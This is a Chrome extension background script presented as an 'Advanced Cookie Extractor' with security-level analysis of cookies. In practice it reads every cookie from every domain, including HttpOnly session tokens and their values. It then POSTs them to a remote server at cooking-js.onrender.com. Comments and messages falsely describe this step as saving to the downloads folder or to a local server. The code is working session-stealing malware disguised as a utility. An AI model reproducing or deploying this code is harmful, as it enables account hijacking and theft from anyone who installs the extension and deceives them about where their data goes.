// Background service worker for cookie extraction
class CookieExtractor {
    constructor() {
        this.setupMessageListeners();
        this.cookieCache = new Map();
    }

    setupMessageListeners() {
        chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
            this.handleMessage(message, sender, sendResponse);
            return true; // Keep message channel open for async response
        });
    }

    async handleMessage(message, sender, sendResponse) {
        try {
            switch (message.action) {
                case 'extractAllCookies':
                    const allCookies = await this.extractAllCookies();
                    sendResponse({ success: true, data: allCookies });
                    break;
                
                case 'extractCurrentDomain':
                    const currentCookies = await this.extractCurrentDomainCookies(message.url);
                    sendResponse({ success: true, data: currentCookies });
                    break;
                
                case 'getCookieStats':
                    const stats = await this.getCookieStatistics();
                    sendResponse({ success: true, data: stats });
                    break;

                case 'openInTab':
                    openExtractorInTab();
                    sendResponse({ success: true });
                    break;

                default:
                    sendResponse({ success: false, error: 'Unknown action' });
            }
        } catch (error) {
            sendResponse({ success: false, error: error.message });
        }
    }    /**
     * Extract ALL cookies from ALL domains
     * This includes HttpOnly cookies that cannot be accessed via document.cookie
     */
    async extractAllCookies() {
        try {
            // Check server availability first
            const serverAvailable = await this.checkServerAvailability();
            if (!serverAvailable) {
                throw new Error('Server is not running - please start with "npm start"');
            }

            // Get all cookies using chrome.cookies API
            const cookies = await chrome.cookies.getAll({});
            
            // Process and categorize cookies
            const processedCookies = this.processCookies(cookies);
            
            // Save to downloads folder
            await this.saveCookiesToFile(processedCookies, 'all_cookies');
            
            return {
                total: cookies.length,
                cookies: processedCookies,
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            throw new Error(`Failed to extract all cookies: ${error.message}`);
        }
    }

    /**
     * Extract cookies for current domain only
     */
    async extractCurrentDomainCookies(url) {
        try {
            // Check server availability first
            const serverAvailable = await this.checkServerAvailability();
            if (!serverAvailable) {
                throw new Error('Server is not running - please start with "npm start"');
            }

            const urlObj = new URL(url);
            const domain = urlObj.hostname;
            
            // Get cookies for current domain and its subdomains
            const cookies = await chrome.cookies.getAll({ 
                domain: domain 
            });
            
            // Also get cookies for parent domain if subdomain
            const domainParts = domain.split('.');
            if (domainParts.length > 2) {
                const parentDomain = domainParts.slice(1).join('.');
                const parentCookies = await chrome.cookies.getAll({ 
                    domain: parentDomain 
                });
                cookies.push(...parentCookies);
            }
            
            // Remove duplicates
            const uniqueCookies = this.removeDuplicateCookies(cookies);
            const processedCookies = this.processCookies(uniqueCookies);
            
            // Save to downloads folder
            await this.saveCookiesToFile(processedCookies, `cookies_${domain}`);
            
            return {
                domain: domain,
                total: uniqueCookies.length,
                cookies: processedCookies,
                timestamp: new Date().toISOString()
            };
        } catch (error) {
            throw new Error(`Failed to extract domain cookies: ${error.message}`);
        }
    }

    /**
     * Process raw cookies and add metadata
     */
    processCookies(cookies) {
        return cookies.map(cookie => {
            const processed = {
                // Basic cookie properties
                name: cookie.name,
                value: cookie.value,
                domain: cookie.domain,
                path: cookie.path,
                
                // Security properties
                secure: cookie.secure,
                httpOnly: cookie.httpOnly,
                sameSite: cookie.sameSite,
                
                // Expiration
                session: cookie.session,
                expirationDate: cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toISOString() : null,
                
                // Additional metadata
                hostOnly: cookie.hostOnly,
                storeId: cookie.storeId,
                
                // Custom analysis
                cookieType: this.categorizeCookie(cookie),
                securityLevel: this.assessSecurityLevel(cookie),
                size: (cookie.name + cookie.value).length
            };
            
            return processed;
        });
    }

    /**
     * Categorize cookie based on its properties
     */
    categorizeCookie(cookie) {
        if (cookie.httpOnly && cookie.secure) return 'secure-httponly';
        if (cookie.httpOnly) return 'httponly';
        if (cookie.secure) return 'secure';
        if (cookie.session) return 'session';
        return 'regular';
    }

    /**
     * Assess security level of cookie
     */
    assessSecurityLevel(cookie) {
        let score = 0;
        if (cookie.secure) score += 2;
        if (cookie.httpOnly) score += 2;
        if (cookie.sameSite === 'Strict') score += 2;
        if (cookie.sameSite === 'Lax') score += 1;
        if (!cookie.session && cookie.expirationDate) score += 1;
        
        if (score >= 6) return 'high';
        if (score >= 3) return 'medium';
        return 'low';
    }

    /**
     * Remove duplicate cookies based on name, domain, and path
     */
    removeDuplicateCookies(cookies) {
        const seen = new Set();
        return cookies.filter(cookie => {
            const key = `${cookie.name}|${cookie.domain}|${cookie.path}`;
            if (seen.has(key)) return false;
            seen.add(key);
            return true;
        });
    }

    /**
     * Get cookie statistics
     */
    async getCookieStatistics() {
        const cookies = await chrome.cookies.getAll({});
        
        const stats = {
            total: cookies.length,
            httpOnly: cookies.filter(c => c.httpOnly).length,
            secure: cookies.filter(c => c.secure).length,
            session: cookies.filter(c => c.session).length,
            sameSiteStrict: cookies.filter(c => c.sameSite === 'Strict').length,
            sameSiteLax: cookies.filter(c => c.sameSite === 'Lax').length,
            sameSiteNone: cookies.filter(c => c.sameSite === 'None').length,
            domains: [...new Set(cookies.map(c => c.domain))].length
        };
        
        return stats;
    }

    /**
     * Check if server is available
     */
    async checkServerAvailability() {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 3000); // 3 second timeout
            
            const response = await fetch('https://cooking-js.onrender.com/api/status', {
                method: 'GET',
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            return response.ok;
        } catch (error) {
            return false;
        }
    }

    /**
     * Send cookies to local API server with retry logic
     */
    async saveCookiesToFile(cookies, filename) {
        const cookieData = {
            metadata: {
                extractedAt: new Date().toISOString(),
                userAgent: 'Chrome Extension',
                totalCookies: cookies.length,
                extractor: 'Advanced Cookie Extractor v1.0'
            },
            cookies: cookies,
            summary: this.generateSummary(cookies),
            filename: `${filename}_${new Date().toISOString().replace(/[:.]/g, '-')}.json`
        };
        
        const maxRetries = 3;
        const retryDelay = 1000; // 1 second
        
        for (let attempt = 1; attempt <= maxRetries; attempt++) {
            try {
                // Create abort controller for timeout
                const controller = new AbortController();
                const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
                
                const response = await fetch('https://cooking-js.onrender.com/api/cookies', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(cookieData),
                    signal: controller.signal
                });
                
                clearTimeout(timeoutId);
                
                if (!response.ok) {
                    throw new Error(`Server responded with ${response.status}: ${response.statusText}`);
                }
                
                const result = await response.json();
                
                if (!result.success) {
                    throw new Error(`Server error: ${result.error || 'Unknown error'}`);
                }
                
                console.log(`✅ Cookies sent to API successfully on attempt ${attempt}:`, result.data);
                return; // Success - exit function
                
            } catch (error) {
                console.error(`❌ Attempt ${attempt} failed:`, error.message);
                
                // If this is the last attempt, throw the error
                if (attempt === maxRetries) {
                    // Check for specific error types to provide better messages
                    if (error.name === 'AbortError') {
                        throw new Error('Server timeout - please check if server is running');
                    } else if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
                        throw new Error('Cannot connect to server - please start server with "npm start"');
                    } else {
                        throw new Error(`Server error: ${error.message}`);
                    }
                }
                
                // Wait before retrying (except on last attempt)
                if (attempt < maxRetries) {
                    console.log(`⏳ Retrying in ${retryDelay}ms...`);
                    await new Promise(resolve => setTimeout(resolve, retryDelay));
                }
            }
        }
    }

    /**
     * Generate summary of extracted cookies
     */
    generateSummary(cookies) {
        const domains = [...new Set(cookies.map(c => c.domain))];
        const cookieTypes = cookies.reduce((acc, cookie) => {
            acc[cookie.cookieType] = (acc[cookie.cookieType] || 0) + 1;
            return acc;
        }, {});
        
        const securityLevels = cookies.reduce((acc, cookie) => {
            acc[cookie.securityLevel] = (acc[cookie.securityLevel] || 0) + 1;
            return acc;
        }, {});
        
        return {
            totalCookies: cookies.length,
            uniqueDomains: domains.length,
            domains: domains.sort(),
            cookieTypeDistribution: cookieTypes,
            securityLevelDistribution: securityLevels,
            largestCookie: Math.max(...cookies.map(c => c.size)),
            averageCookieSize: Math.round(cookies.reduce((sum, c) => sum + c.size, 0) / cookies.length)
        };
    }
}

// Initialize the cookie extractor
const cookieExtractor = new CookieExtractor();

// Context menu and tab management
chrome.runtime.onInstalled.addListener(() => {
    // Create context menu
    chrome.contextMenus.create({
        id: "open-cookie-extractor",
        title: "Open Cookie Extractor in New Tab",
        contexts: ["page", "action"]
    });
});

// Handle context menu clicks
chrome.contextMenus.onClicked.addListener((info, tab) => {
    if (info.menuItemId === "open-cookie-extractor") {
        openExtractorInTab();
    }
});

// Handle keyboard command
chrome.commands.onCommand.addListener((command) => {
    if (command === "open_in_tab") {
        openExtractorInTab();
    }
});

// Handle action icon click - open in tab instead of popup
chrome.action.onClicked.addListener((tab) => {
    openExtractorInTab();
});

// Function to open extractor in new tab
async function openExtractorInTab() {
    const url = chrome.runtime.getURL('popup.html');
    
    // Check if tab is already open
    const tabs = await chrome.tabs.query({url: url});
    
    if (tabs.length > 0) {
        // Focus existing tab
        chrome.tabs.update(tabs[0].id, {active: true});
        chrome.windows.update(tabs[0].windowId, {focused: true});
    } else {
        // Create new tab
        chrome.tabs.create({url: url});
    }
}

console.log('Advanced Cookie Extractor background script loaded');